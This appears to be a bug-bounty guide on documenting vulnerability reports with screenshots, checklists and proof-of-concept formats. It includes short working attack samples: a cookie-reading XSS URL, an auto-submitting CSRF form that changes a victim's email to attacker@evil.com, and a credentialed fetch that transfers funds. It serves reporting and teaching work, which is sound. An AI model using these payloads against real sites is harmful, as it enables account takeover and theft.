# Screenshots & PoC: Best Practices

## Screenshot Guidelines

### Required Elements
- **URL bar visible** (proves location/target)
- **Payload visible** (proves injection point)
- **Proof of execution** (alert box, network request, collaborator ping)
- **Developer Tools** (Console tab showing errors, Network tab showing request)

### Tools
```bash
# Flameshot (Linux)
flameshot gui

# Built-in macOS/Linux screenshot
# Cmd+Shift+4 (macOS) / PrtSc (Linux)

# Browser DevTools full-page screenshot
devtools -> Ctrl+Shift+P -> "Capture full size screenshot"
```

### Screenshot Checklist
- [ ] URL visible
- [ ] No sensitive data exposed (redact if needed)
- [ ] Payload clearly highlighted/annotated
- [ ] Proof of impact visible
- [ ] Resolution high enough to read text

## Proof of Concept Types

### 1. Direct PoC (Simple)
```
https://target.com/search?q=<script>alert(document.cookie)</script>
```

### 2. Interactive PoC (Self-hosted)
```html
<html>
<body>
<form action="https://target.com/change_email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

### 3. Interact.sh / Collaborator PoC (Blind/OOB)
- Include DNS/HTTP interaction log screenshot
- Show that the target server resolved/interacted with collaborator domain

### 4. Script PoC (Complex)
```javascript
// Script demonstrating chained exploit
fetch('https://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({to: 'attacker', amount: 1000})
}).then(r => r.text()).then(console.log)
```

## Burp Suite PoC Export
```
# Right-click request -> "Copy as curl command"
curl -X POST 'https://target.com/api' -H 'Cookie: session=...' -d 'payload'
```

## Video PoCs (For Complex Chains)
- Use `peek` (Linux) or built-in screen recorder
- Max 30 seconds, focus on critical steps
- Annotate with text overlays
